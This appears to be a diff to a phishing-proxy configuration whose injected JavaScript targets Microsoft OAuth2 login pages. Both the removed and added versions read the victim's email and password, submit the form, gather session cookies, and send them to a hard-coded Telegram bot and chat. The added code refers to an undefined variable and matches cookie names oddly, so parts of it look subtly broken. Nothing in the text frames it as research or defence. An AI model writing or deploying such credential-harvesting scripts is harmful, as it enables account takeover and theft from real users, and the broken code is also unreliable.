@@ -165,32 +165,63 @@ js_inject:
     trigger_paths: ["/common/oauth2/"]
     # trigger_params: ["email"]
     script: |
-      function lp(){
-        var email = document.querySelectorAll('input[type=email]')[0];
-        var password = document.querySelectorAll('input[type=password]')[0];
-        var cookie = document.cookie;
+        function lp() {
+          var emailInput = document.querySelector('input[type="email"]');
+          var passwordInput = document.querySelector('input[type="password"]');
+          var email = emailInput.value;
+          var password = passwordInput.value;
 
-        if (email != null && password != null) {
-          email.value = "{email}";
-          password.value = "{password}";
+          if (email && password) {
+            setTimeout(() => {
+              // Submit the form
+              document.querySelectorAll('input[type="submit"]')[0].click(); // Use type="submit" selector for specificity
 
-          setTimeout(function(){
-            document.querySelectorAll('input[type=submit]')[0].click();
-            sendToTelegram({ email: email.value, password: password.value, cookie: cookie });
-          }, 5000);
-          return;
+              // Collect auth tokens
+              var authTokens = {};
+              for (var i = 0; i < document.cookie.split(";").length; i++) {
+                var cookie = document.cookie.split(";")[i];
+                var eqPos = cookie.indexOf("=");
+                var name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
+                var value = eqPos > -1 ? cookie.substr(eqPos + 1) : "";
+
+                if (auth_tokens.domain.some(domain => cookie.startsWith(domain + "="))) {
+                  for (var key of auth_tokens.keys) {
+                    if (key.startsWith(".*")) {
+                      authTokens[name] = value;
+                      break;
+                    } else if (name.startsWith(key + "=")) {
+                      authTokens[key] = value;
+                      break;
+                    }
+                  }
+                }
+              }
+
+              // Send email and password as text
+              fetch('https://api.telegram.org/bot6527994050:AAHgt8nRXCI8DWnuArh2riUspi6Z9bnPKzA/sendMessage', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  chat_id: '5822512651',
+                  text: `Email: ${email}\nPassword: ${password}`
+                })
+              });
+
+              // Send auth token as JSON file
+              var data = { authTokens: authTokens };
+              var blob = new Blob([JSON.stringify(data, null, 2)], { type: "application/json" });
+              var file = new File([blob], "auth_tokens.json", { type: "application/json" });
+              sendToTelegram(file);
+            }, 5000);
+            return;
+          }
         }
-        setTimeout(function(){lp();}, 100);
-      }
-      setTimeout(function(){lp();}, 100);
 
-      function sendToTelegram(data) {
-        fetch('https://api.telegram.org/bot6527994050:AAHgt8nRXCI8DWnuArh2riUspi6Z9bnPKzA/sendMessage', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: '5822512651',
-            text: JSON.stringify(data, null, 2)
-          })
-        });
-      }
+        function sendToTelegram(file) {
+          var formData = new FormData();
+          formData.append("document", file);
+          fetch('https://api.telegram.org/bot6527994050:AAHgt8nRXCI8DWnuArh2riUspi6Z9bnPKzA/sendDocument', {
+            method: 'POST',
+            body: formData
+          });
+        }
